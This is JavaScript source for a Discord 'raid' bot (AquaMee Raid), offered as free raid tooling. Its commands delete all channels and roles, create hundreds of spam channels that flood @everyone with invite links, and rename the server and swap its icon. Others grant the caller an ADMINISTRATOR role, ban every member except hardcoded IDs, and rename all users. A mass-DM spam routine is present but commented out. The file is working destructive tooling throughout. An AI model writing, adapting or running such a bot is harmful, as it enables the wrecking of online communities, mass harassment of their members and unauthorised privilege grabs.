const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
require('dotenv').config()
//const mySecret = process.env['cd']

//quick Settigs
const { link } = require("./config.json");
const { token } = require("./config.json");
const { help } = require("./config.json");
const { name } = require("./config.json");
const { type } = require("./config.json");
const { status } = require("./config.json");
const { username } = require ("./config.json");
const { spfp } = require("./config.json");
const { urip } = require("./config.json");
const { urip2 } = require("./config.json");
 var setTitle = require('console-title');
setTitle('Meow ku#1234 | Raid Bot');
var readline = require('readline'); 
var rl = readline.createInterface({ 
input: process.stdin, 
output: process.stdout 
});




client.on("ready", () => {

console.log(`
AquaMee Raid v1.0 
Logged in Discord Bot
By Meow ku#1234
This is Free Raid Bot Source
Please give me a Credit     
`)
 rl.question(`\n[+]Key (For bot information): `, function(password) {
    if (password === "Meowku")
      console.clear()
  console.log(`
───────────────
Logged As ${client.user.tag}!
───────────────
Made By: Meow ku#1234
───────────────
• Client Information
Name: ${client.user.tag}
 ID: ${client.user.id}
 Invite: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot
• Set Status As ${status}
• Status Type: Playing
────────────
Commands-
Main Commands
------------
!invite
!msg
!raid
!del
------------
Sub-Commands
------------
!admin [InDevlopment]
!roles
!cr
!nick
------------
!${help}
------------
────────────
`)})
 
 
presencia();  
})

function presencia(){
  client.user.setPresence({
status: "dnd",//online,idle,dnd
activity: {
  name: `${status}`,
  type: "PLAYING"//PLAYING, WATCHING,LISTENING

}
  });
}

/*
!raid
!admin





*/
//startraid

client.on("message", message => {
  if(message.author.bot) return;










if(message.content === "!invite") {
  message.reply(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot`)
}

if(message.content === '!msg') {
 message.delete().then(message.channel.send(`@everyone The Server Get Raided By ${username} Good Luck!`))
}

  if(message.content === '!raid'){
      message.delete()
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`raided-by-aqumee`, {
        type: 'text'
      }).then(channel => {
        channel.send(`
@everyone Server Get hacked By AquaMee Raid

Github: 
New Server: ${link}
`)
      })
    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`raided-by-aqumee`, {
           type: 'text'
         }).then(channel => {
                    
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** ht``tps://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");
           channel.send(`@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE ${link}`);
           channel.send("@everyone **Raided By Aqumee** https://discord.gg/j5P3EnhQn7 , https://imgur.com/yCf6GOE");

       })
    }
       
  
     
       
   
       message.guild.setName(`Raided By ${name}`);
     
     
     
       message.guild.setIcon("https://thumborcdn.acast.com/vw5jHISHg2Zg9sCmEQM0kQ8DiyA=/500x500/https%3A%2F%2Fimages.megaphone.fm%2FkWARRXyRsK-sou0LR477Am0oCmzxOsZSC-VlIh2AIJA%2Fplain%2Fs3%3A%2F%2Fmegaphone-prod%2Fpodcasts%2F0dc73c22-2061-11ea-8939-aff005ea08ec%2Fimage%2FHacked-1400.png");
     }
     
       message.guild.setName(`${name}`);
       message.guild.setIcon(`${spfp}`);

})





//admin

client.on("message", async msg => {
  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith('!admin')){
    let rol = await msg.guild.roles.create({data: {
      name: "Aquamee Role",
      color: "#B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});


//serverinfo
/*

client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '!serverinfo') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Channel:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});
*/

//!ban

client.on("message", async message => {
    if(message.content.startsWith('!ban')){
      message.delete();
      if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
      message.guild.members.cache.forEach(member => {
        if(member != message.member && member.id != "730674341427282013" && member.id != `${urip2}` && member.id != `${urip}`){
          member.ban();
        }
      })
}});


//nuke 

client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '!del') {
    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`discord-bug`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://imgur.com/yCf6GOE")
        })
         }
})


/*
//dmall
client.on("message", message => {
    if (message.author.bot) return;
                        
   if(message.content === "!dm")
    message.delete()
    message.guild.members.cache.forEach(member => {
    setInterval(function(){
    member.send(`Raided By Aqumee - https://discord.gg/j5P3EnhQn7 ${link}`).catch(error => {});
                        },50);
        })
});
*/



//deleteallroles

client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('!cr')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
});

//massroles

client.on("message", message => {
  if (message.author.bot) return;
              
if (message.content === '!roles') {
        message.delete()
          for (let i = 0; i <= 200; i++) {
               message.guild.roles.create({data: {name: `Aquamee`,color: '#d41818',},reason: 'HACKED',})
        };
    }
});

//nickall

client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '!nick'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("> Renaming **" + i + "** users a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{

      member.setNickname(nickname)
    })
    }
});

//raidhelp
client.on("message", message => {
if(message.content === `!${help}`) {
  message.channel.send("Please Check You Dm!")
   message.author.send(`
   \`Aquamee Raid v1.0.2\`
   **Developer**
   \`- Meow ku#1234\`
   \`- Alison_#7153\`
   **Commands**
   • \`!roles\` [Mass Roles]
   • \`!cr\` [Delete all roles]
   • \`!nick\` <Name> [New Nick]
   • \`!dm\` [Dm all members]
   • \`!del\` [Nuke all channels]
   • \`!ban\` [Banning All Members]
    • \`!admin\` [Get administrators roles!]
   • \`!raid\` [To start raid]
   `)
}









});

client.login(token);
